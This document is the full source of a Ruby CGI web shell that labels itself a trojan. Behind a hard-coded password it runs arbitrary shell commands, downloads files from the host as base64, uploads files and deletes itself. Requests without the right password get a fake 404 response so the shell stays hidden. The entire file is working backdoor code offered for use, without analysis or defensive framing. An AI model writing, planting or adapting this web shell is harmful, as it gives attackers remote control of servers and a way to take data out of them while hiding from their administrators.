#!/usr/bin/env ruby

# Tested on ruby 1.9.3p194 on Debian Wheezy.
#
# To test this trojan locally, run:
#   ruby -run -ehttpd <this-file> -p<port>

# TODO: Change this password. Don't leave the default!
PASSWORD = 'the-password'

# dependencies
require 'base64'
require 'json'

# read and parse stdin
post = JSON.parse(STDIN.read)

# feign non-existence if the authentication is invalid
unless post['auth'] === PASSWORD
  puts 'status: 404'
  puts
  exit
end

# return JSON to the client
puts 'content-type: application/json'
puts

# payloads
class Trojan

  # file-download payload
  def payload_download(cwd, args)

    # cd to the trojan's cwd
    Dir.chdir cwd

    # open the file as binary, and base64-encode its contents
    begin
      stdout = Base64.encode64(File.open(args['file'], 'rb').read)
      stderr = []
    rescue SystemCallError, IOError => exception
      stdout = []
      stderr = [ 'Could not download file.', exception.message ]
    end

    # return the file
    puts ({ cwd: cwd, stdout: stdout, stderr: stderr }).to_json
  end

  # file-upload payload
  def payload_upload(cwd, args)

    # cd to the trojan's cwd
    Dir.chdir cwd

    # base64-decode the uploaded bytes, and write them to a file
    begin
      File.open(args['dst'], 'w') do |file|
        file.write(Base64.decode64(args['data']))
      end
      stdout = [ "File saved to #{args['dst']}." ]
      stderr = []
    rescue SystemCallError, IOError => exception
      stdout = []
      stderr = [ 'Could not save file.', exception.message ]
    end

    # respond
    puts ({ cwd: cwd, stdout: stdout, stderr: stderr }).to_json
  end

  # trojan autodestruct
  def payload_autodestruct(cwd, args)

    # attempt to delete the trojan
    begin
      File.delete(__FILE__)
      stdout = [ "File #{__FILE__} has autodestructed." ]
      stderr = []
    rescue SystemCallError, IOError => exception
      stdout = []
      stderr = [ "File #{__FILE__} could not autodestruct.", exception.message ]
    end

    # respond
    puts ({ cwd: cwd, stdout: stdout, stderr: stderr }).to_json
  end
  
  # default shell payload
  def method_missing(method, *params)

    # parse out the function params
    cwd  = params[0]
    args = params[1]
    cmd  = "cd #{cwd}; #{method} 2>&1; pwd"

    # initialize stderr and stdout
    stdout = []
    stderr = []

    # run the shell command, and break the response into an array of lines
    output = `#{cmd}`.lines.map(&:chomp)

    # determine the cwd
    cwd = output.pop

    # determine to write to stderr or stdout
    if $?.to_i == 0
      stdout = output
    else
      stderr = output
    end
    
    # return a response
    puts ({ cwd: cwd, stdout: stdout, stderr: stderr }).to_json
  end

end

t = Trojan.new()
t.send(post['cmd'].to_sym, post['cwd'], post['args'])
